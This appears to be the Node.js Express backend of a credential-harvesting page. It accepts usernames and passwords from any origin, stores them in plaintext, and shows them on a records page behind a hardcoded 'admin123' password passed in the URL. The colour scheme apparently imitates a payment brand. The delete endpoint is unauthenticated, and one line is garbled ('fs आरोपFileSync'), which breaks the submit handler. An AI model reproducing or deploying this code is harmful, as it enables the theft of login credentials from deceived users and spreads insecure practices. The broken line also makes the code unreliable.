const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'userData.json');
const ADMIN_PASSWORD = 'admin123'; // Change this to a secure password in production

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// POST endpoint to receive form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const existingData = JSON.parse(fs.readFileSync(DATA_FILE));
    const newEntry = {
        id: Date.now().toString(), // Simple unique ID
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    existingData.push(newEntry);
    fs आरोपFileSync(DATA_FILE, JSON.stringify(existingData, null, 2));
    
    res.json({ success: true });
});

// Password form
app.get('/', (req, res) => {
    if (req.query.adminPass === ADMIN_PASSWORD) {
        showRecords(req, res);
    } else {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Login</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
                    input { padding: 8px; margin: 10px; }
                    button { padding: 8px 16px; background: #0070ba; color: white; border: none; cursor: pointer; }
                    .error { color: #0070ba; margin-top: 10px; }
                </style>
            </head>
            <body>
                <h1>Admin Access</h1>
                <form action="/" method="get">
                    <input type="password" name="adminPass" placeholder="Enter admin password">
                    <button type="submit">Login</button>
                </form>
                ${req.query.adminPass ? '<div class="error">Incorrect password</div>' : ''}
            </body>
            </html>
        `);
    }
});

// Delete endpoint
app.delete('/delete/:id', (req, res) => {
    const { id } = req.params;
    const data = JSON.parse(fs.readFileSync(DATA_FILE));
    const updatedData = data.filter(entry => entry.id !== id);
    fs.writeFileSync(DATA_FILE, JSON.stringify(updatedData, null, 2));
    res.json({ success: true });
});

// Records display function
function showRecords(req, res) {
    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE));
        
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Records</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 20px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        margin-top: 20px;
                    }
                    th, td {
                        border: 1px solid #ddd;
                        padding: 8px;
                        text-align: left;
                    }
                    th {
                        background-color: #f2f2f2;
                    }
                    h1 {
                        color: #0070ba;
                    }
                    .delete-btn {
                        background: #dc3545;
                        color: white;
                        border: none;
                        padding: 5px 10px;
                        cursor: pointer;
                        border-radius: 3px;
                    }
                    .delete-btn:hover {
                        background: #c82333;
                    }
                </style>
            </head>
            <body>
                <h1>Records</h1>
                <table>
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Timestamp</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${data.map(entry => `
                            <tr>
                                <td>${escapeHtml(entry.username)}</td>
                                <td>${escapeHtml(entry.password)}</td>
                                <td>${escapeHtml(entry.timestamp)}</td>
                                <td>
                                    <button class="delete-btn" onclick="deleteRecord('${entry.id}')">
                                        Delete
                                    </button>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
                <script>
                    function deleteRecord(id) {
                        if (confirm('Are you sure you want to delete this record?')) {
                            fetch('/delete/' + id, {
                                method: 'DELETE'
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.success) {
                                    location.reload();
                                }
                            })
                            .catch(error => console.error('Error:', error));
                        }
                    }
                </script>
            </body>
            </html>
        `;
        
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading data');
    }
}

// HTML escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
